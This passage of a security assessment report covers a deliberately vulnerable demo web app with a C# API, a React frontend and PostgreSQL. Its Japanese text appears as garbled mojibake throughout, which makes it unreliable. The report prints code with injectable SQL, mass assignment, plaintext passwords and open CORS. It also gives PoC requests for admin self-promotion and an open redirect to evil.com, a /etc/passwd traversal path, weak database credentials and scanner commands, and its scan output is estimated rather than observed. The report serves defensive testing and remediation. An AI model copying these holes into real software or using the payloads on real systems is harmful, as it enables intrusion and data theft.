// ãƒ•ã‚¡ã‚¤ãƒ«: src/api/VulnApi/Controllers/UsersController.cs
// è¡Œ: 65-90

[HttpPost]
public async Task<IActionResult> CreateUser([FromBody] User user)
{
    // âš ï¸ è„†å¼±æ€§ A-06: Mass Assignment
    // ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã‚‰ç›´æ¥ role ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’ãƒã‚¤ãƒ³ãƒ‰
    using var connection = _dbFactory.CreateConnection();
    await connection.OpenAsync();
    
    var query = $@"
        INSERT INTO users (username, email, password, role, profile_image_url)
        VALUES ('{user.Username}', '{user.Email}', '{user.Password}', 
                '{user.Role}', '{user.ProfileImageUrl}')
        RETURNING id";
    // ...
}
```

**PoCï¼ˆæ¨©é™æ˜‡æ ¼ï¼‰**:
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@example.com",
  "password": "test",
  "role": "admin"  // âš ï¸ é€šå¸¸ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒç®¡ç†è€…æ¨©é™ã‚’è‡ªå·±ä»˜ä¸
}
```

### 3.8 ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¹³æ–‡ä¿å­˜ï¼ˆCriticalï¼‰

```csharp
// ãƒ•ã‚¡ã‚¤ãƒ«: src/api/VulnApi/Controllers/UsersController.cs
// ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥åŒ–å‡¦ç†ãŒå­˜åœ¨ã—ãªã„

var query = $@"
    INSERT INTO users (username, email, password, role, profile_image_url)
    VALUES ('{user.Username}', '{user.Email}', '{user.Password}', 
            '{user.Role}', '{user.ProfileImageUrl}')";
```

**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®å®Ÿãƒ‡ãƒ¼ã‚¿**:
```sql
SELECT username, password FROM users;
/*
 username | password
----------+----------
 admin    | admin123
 tanaka   | password
 suzuki   | 123456
 sato     | qwerty
 yamada   | letmein
*/
```

**å½±éŸ¿**:
- SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ä¸€æ‹¬çªƒå–
- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—æ¼æ´©æ™‚ã®å³åº§ã®ä¾µå®³
- ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ä½¿ã„å›ã—ã«ã‚ˆã‚‹ä»–ã‚µãƒ¼ãƒ“ã‚¹ã¸ã®æ³¢åŠ

### 3.9 CORSè¨­å®šã®ä¸å‚™ï¼ˆHighï¼‰

```csharp
// ãƒ•ã‚¡ã‚¤ãƒ«: src/api/VulnApi/Program.cs
// è¡Œ: 8-15

builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        // âš ï¸ è„†å¼±æ€§ A-05: CORSè¨­å®šã®ä¸å‚™
        policy.AllowAnyOrigin()    // å…¨ã‚ªãƒªã‚¸ãƒ³è¨±å¯
              .AllowAnyMethod()    // å…¨HTTPãƒ¡ã‚½ãƒƒãƒ‰è¨±å¯
              .AllowAnyHeader();   // å…¨ãƒ˜ãƒƒãƒ€è¨±å¯
    });
});
```

**å½±éŸ¿**:
- CSRFæ”»æ’ƒãŒå®¹æ˜“
- æ‚ªæ„ã‚ã‚‹ã‚µã‚¤ãƒˆã‹ã‚‰ã®APIå‘¼ã³å‡ºã—
- ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ä»˜ããƒªã‚¯ã‚¨ã‚¹ãƒˆã®å¯èƒ½æ€§ï¼ˆWithCredentialsä½¿ç”¨æ™‚ï¼‰

### 3.10 ã‚ªãƒ¼ãƒ—ãƒ³ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆï¼ˆMediumï¼‰

```typescript
// ãƒ•ã‚¡ã‚¤ãƒ«: src/frontend/src/pages/UserList.tsx
// è¡Œ: 25-30

const handleLogin = () => {
  const urlParams = new URLSearchParams(window.location.search);
  const redirect = urlParams.get('redirect');
  
  // âš ï¸ è„†å¼±æ€§ F-03: ã‚ªãƒ¼ãƒ—ãƒ³ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ
  // ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆå…ˆã®ãƒãƒªãƒ‡ãƒ¼ã‚·ãƒ§ãƒ³ãªã—
  window.location.href = redirect || '/login';
};
```

**PoC**:
```
http://localhost:3000/?redirect=https://evil.com/phishing
```

### 3.11 æ©Ÿå¯†æƒ…å ±ã®ãƒ­ã‚°å‡ºåŠ›ï¼ˆMediumï¼‰

```typescript
// ãƒ•ã‚¡ã‚¤ãƒ«: src/frontend/src/api.ts, src/frontend/src/config.ts

// ãƒ‡ãƒãƒƒã‚°ãƒ­ã‚°é–¢æ•°
export const debugLog = (message: string, data?: any) => {
  console.log(`[DEBUG] ${message}`, data);  // âš ï¸ æœ¬ç•ªç’°å¢ƒã§ã‚‚å®Ÿè¡Œ
};

// ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒ­ã‚°å‡ºåŠ›
export const login = async (username: string, password: string) => {
  debugLog('Login attempt', { username, password });  // âš ï¸ è„†å¼±æ€§ F-05
  // ...
};
```

**å½±éŸ¿**:
- ãƒ–ãƒ©ã‚¦ã‚¶é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã§ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰éœ²å‡º
- ãƒ­ã‚°åé›†ã‚·ã‚¹ãƒ†ãƒ çµŒç”±ã§ã®æƒ…å ±æ¼æ´©

---

## 4. ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å±¤ã‚¹ã‚­ãƒ£ãƒ³çµæœï¼ˆé™çš„æ¨å®šï¼‰

### 4.1 æƒ³å®šNmapã‚¹ã‚­ãƒ£ãƒ³çµæœ

**å®Ÿè¡Œæƒ³å®šã‚³ãƒãƒ³ãƒ‰**:
```bash
nmap -sV -sC --script=vuln,ssl-enum-ciphers -p 80,5000,5432 frontend api db
```

### 4.2 æ¤œå‡ºãƒãƒ¼ãƒˆãƒ»ã‚µãƒ¼ãƒ“ã‚¹ï¼ˆæ¨å®šï¼‰

| ãƒ›ã‚¹ãƒˆ | ãƒãƒ¼ãƒˆ | çŠ¶æ…‹ | ã‚µãƒ¼ãƒ“ã‚¹ | ãƒãƒ¼ã‚¸ãƒ§ãƒ³ |
|--------|--------|------|---------|-----------|
| **frontend** | 80/tcp | open | http | Nginx (Alpine) |
| **api** | 5000/tcp | open | http | Kestrel (ASP.NET Core 10.0-preview) |
| **db** | 5432/tcp | open | postgresql | PostgreSQL 16.x |
| **localhost** | 3000/tcp | open | http | Nginx (proxy to frontend:80) |
| **localhost** | 5000/tcp | open | http | Kestrel (proxy to api:5000) |
| **localhost** | 15432/tcp | open | postgresql | PostgreSQL 16.x âš ï¸ **å¤–éƒ¨å…¬é–‹** |

### 4.3 è„†å¼±æ€§ã‚¹ã‚¯ãƒªãƒ—ãƒˆçµæœï¼ˆæ¨å®šï¼‰

#### 4.3.1 PostgreSQLå¤–éƒ¨å…¬é–‹ï¼ˆCriticalï¼‰

```
PORT      STATE SERVICE
15432/tcp open  postgresql

| postgresql-brute:
|   Accounts:
|     postgres:postgres123 - Valid credentials âš ï¸
|   Statistics: Performed 50 guesses in 5 seconds
```

**ãƒªã‚¹ã‚¯**: 
- å¼±ã„èªè¨¼æƒ…å ±ã«ã‚ˆã‚‹ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹
- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å…¨ä½“ã®æ¼æ´©ãƒ»æ”¹ã–ã‚“
- ãƒãƒƒã‚¯ãƒ‰ã‚¢ã®è¨­ç½®

#### 4.3.2 HTTPã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ã®æ¬ å¦‚ï¼ˆMediumï¼‰

```
PORT     STATE SERVICE
80/tcp   open  http
5000/tcp open  http

| http-security-headers:
|   Missing security headers:
|     X-Frame-Options: âš ï¸ ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°å¯¾ç­–ãªã—
|     X-Content-Type-Options: âš ï¸ MIME sniffingå¯¾ç­–ãªã—
|     Content-Security-Policy: âš ï¸ XSSç·©å’Œç­–ãªã—
|     Strict-Transport-Security: âš ï¸ HTTPSå¼·åˆ¶ãªã—ï¼ˆHTTPã®ã¿ï¼‰
|     X-XSS-Protection: âš ï¸ ãƒ–ãƒ©ã‚¦ã‚¶XSSãƒ•ã‚£ãƒ«ã‚¿ç„¡åŠ¹
```

#### 4.3.3 SSL/TLSæœªä½¿ç”¨ï¼ˆHighï¼‰

```
| ssl-enum-ciphers:
|   No SSL/TLS detected âš ï¸
|   All communication in PLAINTEXT
|   Risk: Man-in-the-Middle attacks
```

---

## 5. Webã‚µãƒ¼ãƒãƒ¼ã‚¹ã‚­ãƒ£ãƒ³çµæœï¼ˆé™çš„æ¨å®šï¼‰

### 5.1 æƒ³å®šNiktoã‚¹ã‚­ãƒ£ãƒ³çµæœ

#### 5.1.1 Frontendï¼ˆNginxï¼‰

**å®Ÿè¡Œæƒ³å®šã‚³ãƒãƒ³ãƒ‰**:
```bash
nikto -h http://frontend:80 -Tuning x 2 3 4 5
```

**æ¤œå‡ºé …ç›®ï¼ˆæ¨å®šï¼‰**:

| ID | ãƒªã‚¹ã‚¯ | æ¤œå‡ºå†…å®¹ |
|----|--------|---------|
| N-001 | Medium | Server: nginx - ã‚µãƒ¼ãƒãƒ¼ãƒãƒ¼ã‚¸ãƒ§ãƒ³éœ²å‡º |
| N-002 | Medium | X-Frame-Options ãƒ˜ãƒƒãƒ€ãªã— - ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°è„†å¼± |
| N-003 | Medium | X-Content-Type-Options ãƒ˜ãƒƒãƒ€ãªã— |
| N-004 | High | Content-Security-Policy ãƒ˜ãƒƒãƒ€ãªã— - XSSç·©å’Œç­–ãªã— |
| N-005 | Low | X-XSS-Protection ãƒ˜ãƒƒãƒ€ãªã— |
| N-006 | Info | ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒªã‚¹ãƒ†ã‚£ãƒ³ã‚°ç„¡åŠ¹ï¼ˆæ­£å¸¸ï¼‰ |
| N-007 | Info | /api/ â†’ ãƒªãƒãƒ¼ã‚¹ãƒ—ãƒ­ã‚­ã‚·è¨­å®šæ¤œå‡º |

#### 5.1.2 APIï¼ˆASP.NET Coreï¼‰

**å®Ÿè¡Œæƒ³å®šã‚³ãƒãƒ³ãƒ‰**:
```bash
nikto -h http://api:5000 -Tuning x 2 3 4 5
```

**æ¤œå‡ºé …ç›®ï¼ˆæ¨å®šï¼‰**:

| ID | ãƒªã‚¹ã‚¯ | æ¤œå‡ºå†…å®¹ |
|----|--------|---------|
| A-001 | High | Server: Kestrel - ãƒãƒ¼ã‚¸ãƒ§ãƒ³æƒ…å ±éœ²å‡º |
| A-002 | Critical | /openapi/v1.json - APIä»•æ§˜ãŒå…¬é–‹ |
| A-003 | High | è©³ç´°ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ - ã‚¹ã‚¿ãƒƒã‚¯ãƒˆãƒ¬ãƒ¼ã‚¹éœ²å‡º |
| A-004 | Medium | CORS: Access-Control-Allow-Origin: * |
| A-005 | Medium | ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€å…¨èˆ¬ã®æ¬ å¦‚ |
| A-006 | Info | /api/users - èªè¨¼ãªã—ã§ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ |
| A-007 | Info | Content-Type: application/json |

---

## 6. Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚¹ã‚­ãƒ£ãƒ³çµæœï¼ˆé™çš„æ¨å®šï¼‰

### 6.1 æƒ³å®šOWASP ZAPãƒ™ãƒ¼ã‚¹ãƒ©ã‚¤ãƒ³ã‚¹ã‚­ãƒ£ãƒ³

**å®Ÿè¡Œæƒ³å®šã‚³ãƒãƒ³ãƒ‰**:
```bash
zap-baseline.py -t http://frontend:80 -J zap-baseline-report.json
```

### 6.2 ã‚¢ãƒ©ãƒ¼ãƒˆä¸€è¦§ï¼ˆæ¨å®šï¼‰

#### Critical Risk

| ID | è„†å¼±æ€§ | ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ | URLä¾‹ | è¨¼æ‹  |
|----|--------|------------|-------|------|
| Z-001 | SQL Injection | 6 | /api/users?search=test | `'` ã§ã‚¨ãƒ©ãƒ¼ |
| Z-002 | Remote Code Execution | 1 | /api/import | Deserialization |
| Z-003 | Authentication Bypass | 8 | /api/* | å…¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ |

#### High Risk

| ID | è„†å¼±æ€§ | ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ | URLä¾‹ | è¨¼æ‹  |
|----|--------|------------|-------|------|
| Z-004 | Cross-Site Scripting (Stored) | 1 | /users/1 | dangerouslySetInnerHTML |
| Z-005 | Path Traversal | 1 | /api/files/../../../etc/passwd | ãƒ•ã‚¡ã‚¤ãƒ«èª­ã¿å–ã‚Š |
| Z-006 | CORS Misconfiguration | 8 | /api/* | Allow-Origin: * |

#### Medium Risk

| ID | è„†å¼±æ€§ | ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ | URLä¾‹ | è¨¼æ‹  |
|----|--------|------------|-------|------|
| Z-007 | Missing Security Headers | 2 | /, /api/* | è¤‡æ•°ãƒ˜ãƒƒãƒ€æ¬ å¦‚ |
| Z-008 | Information Disclosure | 1 | /openapi/v1.json | APIä»•æ§˜å…¬é–‹ |
| Z-009 | Sensitive Data in URL | 1 | /users?search= | GETãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ |
| Z-010 | Cookie without Secure Flag | 0 | - | Cookieæœªä½¿ç”¨ |

#### Low Risk

| ID | è„†å¼±æ€§ | ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ | URLä¾‹ | è¨¼æ‹  |
|----|--------|------------|-------|------|
| Z-011 | Server Version Disclosure | 2 | /, /api/* | Server ãƒ˜ãƒƒãƒ€ |
| Z-012 | X-Powered-By Header | 0 | - | ãƒ˜ãƒƒãƒ€ãªã— |

### 6.3 æƒ³å®šZAP APIã‚¹ã‚­ãƒ£ãƒ³çµæœ

**å®Ÿè¡Œæƒ³å®šã‚³ãƒãƒ³ãƒ‰**:
```bash
zap-api-scan.py -t http://api:5000/openapi/v1.json -f openapi
```

**OpenAPIå®šç¾©è§£æçµæœ**:

```json
{
  "endpoints": 8,
  "unauthenticatedEndpoints": 8,
  "securitySchemes": 0,
  "alerts": [
    {
      "risk": "Critical",
      "name": "No Authentication Required",
      "count": 8,
      "description": "å…¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã« security å®šç¾©ãªã—"
    },
    {
      "risk": "High",
      "name": "Sensitive Data Exposure",
      "count": 3,
      "description": "password ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«å«ã¾ã‚Œã‚‹å¯èƒ½æ€§"
    },
    {
      "risk": "Medium",
      "name": "API Schema Exposure",
      "count": 1,
      "description": "OpenAPIå®šç¾©ãŒèªè¨¼ãªã—ã§ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½"
    }
  ]
}
```

---

## 7. ç·åˆæ¤œå‡ºã‚µãƒãƒªãƒ¼

### 7.1 ãƒªã‚¹ã‚¯ãƒ¬ãƒ™ãƒ«åˆ¥é›†è¨ˆ

| ãƒªã‚¹ã‚¯ãƒ¬ãƒ™ãƒ« | æ¤œå‡ºæ•° | ä¸»ãªé …ç›® |
|------------|--------|---------|
| **Critical** | 11 | SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³(6), èªè¨¼æ¬ å¦‚(8), ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º(1), DBå¤–éƒ¨å…¬é–‹(1), å¹³æ–‡ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰(1) |
| **High** | 11 | XSS(1), ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«(1), CORSä¸å‚™(1), rootå®Ÿè¡Œ(2), ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆéœ²å‡º(4), é–‹ç™ºãƒ¢ãƒ¼ãƒ‰(1) |
| **Medium** | 10 | ãƒ˜ãƒƒãƒ€ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³(1), Mass Assignment(1), ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€æ¬ å¦‚(2), ã‚¨ãƒ©ãƒ¼éœ²å‡º(1), ã‚ªãƒ¼ãƒ—ãƒ³ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ(1), ãã®ä»–(4) |
| **Low** | 7 | ãƒãƒ¼ã‚¸ãƒ§ãƒ³æƒ…å ±éœ²å‡º(2), ãƒ­ã‚°å‡ºåŠ›(1), ãã®ä»–(4) |
| **Informational** | 3 | OpenAPIå…¬é–‹(1), ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªæ§‹é€ (1), ãã®ä»–(1) |

### 7.2 OWASP Top 10 ãƒãƒƒãƒ”ãƒ³ã‚°

| OWASP 2021 | ã‚«ãƒ†ã‚´ãƒª | è©²å½“è„†å¼±æ€§æ•° | æ¤œå‡ºäº‹ä¾‹ |
|-----------|---------|------------|---------|
| **A01:2021** | Broken Access Control | 9 | èªè¨¼æ¬ å¦‚, Mass Assignment, èªå¯ãªã—å‰Šé™¤ |
| **A02:2021** | Cryptographic Failures | 4 | å¹³æ–‡ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰, SSLç„¡åŠ¹, ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆéœ²å‡º |
| **A03:2021** | Injection | 6 | SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³, HTTPãƒ˜ãƒƒãƒ€ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ |
| **A04:2021** | Insecure Design | 3 | ãƒ¬ãƒ¼ãƒˆåˆ¶é™ãªã—, é–‹ç™ºãƒ¢ãƒ¼ãƒ‰, ãƒ­ã‚®ãƒ³ã‚°ä¸å‚™ |
| **A05:2021** | Security Misconfiguration | 8 | CORS, ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€, rootå®Ÿè¡Œ, DBå…¬é–‹ |
| **A06:2021** | Vulnerable Components | 2 | Newtonsoft.Jsonè¨­å®šãƒŸã‚¹, å¤ã„ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸æƒ³å®š |
| **A07:2021** | Auth/Identity Failures | 3 | å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰, èªè¨¼æ¬ å¦‚, ã‚»ãƒƒã‚·ãƒ§ãƒ³ç®¡ç†ãªã— |
| **A08:2021** | Software/Data Integrity | 1 | å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º |
| **A09:2021** | Logging Failures | 2 | æ©Ÿå¯†æƒ…å ±ãƒ­ã‚°, ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ä¸å‚™ |
| **A10:2021** | SSRF | 0 | è©²å½“ãªã— |

### 7.3 CWEï¼ˆCommon Weakness Enumerationï¼‰åˆ†é¡

| CWE-ID | åç§° | ä»¶æ•° | ãƒªã‚¹ã‚¯ |
|--------|------|------|--------|
| CWE-89 | SQL Injection | 6 | Critical |
| CWE-79 | Cross-site Scripting | 1 | High |
| CWE-502 | Deserialization of Untrusted Data | 1 | Critical |
| CWE-22 | Path Traversal | 1 | High |
| CWE-287 | Improper Authentication | 8 | Critical |
| CWE-798 | Use of Hard-coded Credentials | 4 | High |
| CWE-916 | Use of Password Hash With Insufficient Computational Effort | 1 | Critical |
| CWE-284 | Improper Access Control | 9 | High |
| CWE-918 | Server-Side Request Forgery (SSRF) | 0 | - |
| CWE-611 | XXE | 0 | - |

### 7.4 æ”»æ’ƒã‚·ãƒŠãƒªã‚ªå„ªå…ˆåº¦

#### ã‚·ãƒŠãƒªã‚ª1: ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å®Œå…¨æŒæ¡ï¼ˆCriticalï¼‰

**æ”»æ’ƒãƒ‘ã‚¹**:
```
1. SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆ/api/users?search=ï¼‰
   â†“
2. ç®¡ç†è€…ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å–å¾—ï¼ˆå¹³æ–‡ï¼‰
   â†“
3. å…¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‡ãƒ¼ã‚¿çªƒå–
   â†“
4. ãƒ‡ãƒ¼ã‚¿æ”¹ã–ã‚“ãƒ»å‰Šé™¤
```

**æ‰€è¦æ™‚é–“**: 5åˆ†æœªæº€  
**å¿…è¦ã‚¹ã‚­ãƒ«**: åˆç´šï¼ˆsqlmapã§è‡ªå‹•åŒ–å¯èƒ½ï¼‰

#### ã‚·ãƒŠãƒªã‚ª2: ã‚µãƒ¼ãƒãƒ¼ä¾µå®³ï¼ˆCriticalï¼‰

**æ”»æ’ƒãƒ‘ã‚¹**:
```
1. å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºï¼ˆ/api/importï¼‰
   â†“
2. ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ
   â†“
3. ã‚³ãƒ³ãƒ†ãƒŠå†…ã§ã®æ¨©é™æ˜‡æ ¼ï¼ˆrootå®Ÿè¡Œï¼‰
   â†“
4. ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹
   â†“
5. æ°¸ç¶šåŒ–ãƒãƒƒã‚¯ãƒ‰ã‚¢è¨­ç½®
```

**æ‰€è¦æ™‚é–“**: 10åˆ†æœªæº€  
**å¿…è¦ã‚¹ã‚­ãƒ«**: ä¸­ç´šï¼ˆysoserial.netä½¿ç”¨ï¼‰

#### ã‚·ãƒŠãƒªã‚ª3: èªè¨¼ãƒã‚¤ãƒ‘ã‚¹çµŒç”±ã®ç‰¹æ¨©æ˜‡æ ¼ï¼ˆCriticalï¼‰

**æ”»æ’ƒãƒ‘ã‚¹**:
```
1. SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³èªè¨¼ãƒã‚¤ãƒ‘ã‚¹ï¼ˆ/api/loginï¼‰
   â†“
2. Mass Assignmentã§ç®¡ç†è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ä½œæˆ
   â†“
3. å…¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å‰Šé™¤ãƒ»æ”¹ã–ã‚“
```

**æ‰€è¦æ™‚é–“**: 3åˆ†æœªæº€  
**å¿…è¦ã‚¹ã‚­ãƒ«**: åˆç´š

#### ã‚·ãƒŠãƒªã‚ª4: ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ï¼ˆCriticalï¼‰

**æ”»æ’ƒãƒ‘ã‚¹**:
```
1. Nmapã§ãƒãƒ¼ãƒˆ15432æ¤œå‡º
   â†“
2. ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆèªè¨¼æƒ…å ±ã§ãƒ­ã‚°ã‚¤ãƒ³ï¼ˆpostgres/postgres123ï¼‰
   â†“
3. å…¨ãƒ‡ãƒ¼ã‚¿ãƒ€ãƒ³ãƒ—
   â†“
4. ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚¢ã‚«ã‚¦ãƒ³ãƒˆä½œæˆ
```

**æ‰€è¦æ™‚é–“**: 2åˆ†æœªæº€  
**å¿…è¦ã‚¹ã‚­ãƒ«**: åˆç´š

#### ã‚·ãƒŠãƒªã‚ª5: XSSçµŒç”±ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ä¹—ã£å–ã‚Šï¼ˆHighï¼‰

**æ”»æ’ƒãƒ‘ã‚¹**:
```
1. XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰æŠ•ç¨¿ï¼ˆprofile_image_urlï¼‰
   â†“
2. ç®¡ç†è€…ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼è©³ç´°ç”»é¢ã‚’é–²è¦§
   â†“
3. Cookieçªƒå–
   â†“
4. ã‚»ãƒƒã‚·ãƒ§ãƒ³ä¹—ã£å–ã‚Šï¼ˆâ€»ç¾çŠ¶Cookieèªè¨¼ãªã—ï¼‰
```

**æ‰€è¦æ™‚é–“**: 10åˆ†æœªæº€  
**å¿…è¦ã‚¹ã‚­ãƒ«**: ä¸­ç´š

---

## 8. æ¨å¥¨ã•ã‚Œã‚‹å³æ™‚å¯¾å¿œ

### 8.1 Criticalå„ªå…ˆåº¦ï¼ˆå³åº§ã«å¯¾å¿œï¼‰

| # | è„†å¼±æ€§ | å³æ™‚å¯¾å¿œç­– |
|---|--------|-----------|
| 1 | **DBå¤–éƒ¨å…¬é–‹** | docker-compose.yml ã‹ã‚‰ `ports: - "15432:5432"` ã‚’å‰Šé™¤ |
| 2 | **SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³** | ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã‚¯ã‚¨ãƒªã¸å…¨é¢ç§»è¡Œï¼ˆDapperç­‰ã®ORMä½¿ç”¨ï¼‰ |
| 3 | **èªè¨¼æ¬ å¦‚** | JWTèªè¨¼ã®å®Ÿè£…ã€å…¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«`[Authorize]`é©ç”¨ |
| 4 | **å¹³æ–‡ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰** | BCrypt/Argon2ã«ã‚ˆã‚‹ãƒãƒƒã‚·ãƒ¥åŒ–å®Ÿè£… |
| 5 | **å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º** | `TypeNameHandling.None`ã«å¤‰æ›´ã€ã¾ãŸã¯å»ƒæ­¢ |

### 8.2 Highå„ªå…ˆåº¦ï¼ˆ24æ™‚é–“ä»¥å†…ï¼‰

| # | è„†å¼±æ€§ | å¯¾å¿œç­– |
|---|--------|--------|
| 1 | **XSS** | DOMPurifyå°å…¥ã€dangerouslySetInnerHTMLå‰Šé™¤ |
| 2 | **ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«** | ãƒ‘ã‚¹æ­£è¦åŒ–ã¨ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆæ¤œè¨¼ |
| 3 | **CORSä¸å‚™** | ç‰¹å®šã‚ªãƒªã‚¸ãƒ³ã®ã¿è¨±å¯ |
| 4 | **rootå®Ÿè¡Œ** | Dockerfileã«éç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼è¿½åŠ  |
| 5 | **ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆéœ²å‡º** | ç’°å¢ƒå¤‰æ•°ãƒ»Secretsã¸ç§»è¡Œ |

### 8.3 Mediumå„ªå…ˆåº¦ï¼ˆ1é€±é–“ä»¥å†…ï¼‰

| # | è„†å¼±æ€§ | å¯¾å¿œç­– |
|---|--------|--------|
| 1 | **ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€** | Helmet.jsç­‰ã§ãƒ˜ãƒƒãƒ€è¿½åŠ  |
| 2 | **Mass Assignment** | DTOã‚¯ãƒ©ã‚¹ã§ãƒã‚¤ãƒ³ãƒ‰åˆ¶å¾¡ |
| 3 | **ã‚¨ãƒ©ãƒ¼éœ²å‡º** | æœ¬ç•ªç’°å¢ƒã§`ASPNETCORE_ENVIRONMENT=Production` |
| 4 | **ãƒ¬ãƒ¼ãƒˆåˆ¶é™** | AspNetCoreRateLimitãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢è¿½åŠ  |

---

## 9. ã‚¹ã‚­ãƒ£ãƒ³ç”Ÿãƒ‡ãƒ¼ã‚¿ã®æ ¼ç´å…ˆ

### 9.1 Trivyã‚¹ã‚­ãƒ£ãƒ³çµæœ

```
/docker-work-dir/reports/trivy/
  â”œâ”€â”€ trivy-fs-report.txt        # ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚¹ã‚­ãƒ£ãƒ³
